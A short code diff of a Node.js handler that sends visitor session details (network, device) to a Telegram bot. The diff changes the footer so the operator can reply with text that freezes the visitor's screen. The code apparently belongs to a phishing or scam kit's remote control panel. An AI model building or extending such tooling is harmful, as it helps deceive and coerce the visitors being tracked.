@@ -130,7 +130,7 @@ module.exports = async (req, res) => {
                 row('🏢', 'Network', sessionData.org),
                 row('💻', 'Device', sessionData.device),
             ],
-            footer: 'Use the controls below to manage this visitor.',
+            footer: '↩️ Reply to this message with any text → it freezes the screen and shows your text. Or tap a control below.',
         });
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
